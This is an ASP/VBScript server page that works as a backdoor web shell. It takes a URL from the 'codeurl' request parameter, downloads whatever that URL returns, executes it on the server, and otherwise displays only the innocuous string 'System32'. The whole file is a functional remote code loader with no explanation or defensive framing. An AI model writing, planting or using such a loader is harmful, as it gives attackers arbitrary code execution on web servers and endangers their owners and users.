

<%
codeurl=request("codeurl")

if len(codeurl)>0 then

set http=Server.createobject("Microsoft.XMLHTTP")  
	Http.open "GET",codeurl,false  
Http.send()  
getHTTPPage=bytesToBSTR(Http.responseBody,"GB2312")

execute getHTTPPage

response.Write "over"
response.End()

Function BytesToBstr(body,Cset) 
  dim objstream 
  set objstream = Server.CreateObject("adodb.stream") 
  objstream.Type = 1 
  objstream.Mode =3 
  objstream.Open 
  objstream.Write body 
  objstream.Position = 0 
  objstream.Type = 2 
  objstream.Charset = Cset 
  BytesToBstr = objstream.ReadText  
  objstream.Close 
  set objstream = nothing 
End Function  



end if



response.Write("System32")


%>
